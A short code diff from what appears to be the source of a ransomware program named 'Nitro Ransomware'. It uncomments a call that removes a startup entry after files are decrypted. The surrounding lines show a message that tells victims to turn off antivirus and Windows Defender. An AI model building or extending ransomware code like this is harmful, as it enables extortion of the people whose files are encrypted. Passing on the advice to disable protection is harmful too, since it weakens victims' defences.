@@ -68,7 +68,7 @@ namespace NitroRansomware
                 Program.DecryptAll();
                 Cursor.Current = Cursors.Default;
                 MessageBox.Show("Task complete. If there are files that have not been decrypted, make sure you turn off all antivirus and Windows Defender, then try decrypting again. \r\nIf it doesn't work, delete all Desktop.ini.givemenitro files that you see and try again.", "Nitro Ransomware", MessageBoxButtons.OK, MessageBoxIcon.Information);
-                //Program.RemoveStart();
+                Program.RemoveStart();
             }
             else
             {
